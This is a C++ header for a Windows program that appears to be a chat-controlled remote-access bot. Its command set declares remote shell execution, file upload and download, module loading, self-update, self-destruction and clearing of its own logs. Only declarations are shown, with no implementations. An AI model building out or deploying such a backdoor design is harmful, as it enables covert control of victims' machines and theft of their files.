//
// Created by crazy on 07.12.2021.
//

#ifndef BOT_APP_H
#define BOT_APP_H


#include "./types.h"
#include "./Bot.h"
#include "./logging.h"
#include "./Message.h"
#include <windows.h>
#include <experimental/filesystem>
#include "./Config.h"

namespace fs = std::experimental::filesystem;

class App {
private:
    bot::Bot &m_bot;

    rq::Requests m_requests1;

    bool m_stop = false;

    enum COMMANDS {
        GETTERS = 0,

        GET_VER = 1,
        GET_IP = 2,
        GET_SELF_LOGS = 3,
        GET_MODULES = 4,

        ACTIONS = 100,

        C_STOP = 101,
        C_EXEC = 102,
        C_UPDATE = 103,
        C_DOWNLOAD_FILE = 104,
        C_DOWNLOAD_MODULE = 105,
        C_START_MODULE = 106,
        C_UPLOAD_FILE = 107,
        C_SELF_DESTROY = 108,
        C_CLEAR_SELF_LOGS = 109
    };

    static str execWithRussianOut(const char *cmd);

    static str exec(const char *cmd);

    str getIpConfig();

    void replyOnCommand(bot::Message &msg, str content, str json = "");

    void handleMessage(bot::Message &msg);

    void update();

    static void installUpdate(json &jsonContent);

    static int extractZip(const str &filePath, char *pwd = nullptr);

    static void destroySelf();

    static str startModule(const str &name, const str &args);

    static int markSystem();

    int getSystemMark();

    void replaceBot();


public:
    explicit App(bot::Bot &bot);

    void run();


};


#endif //BOT_APP_H
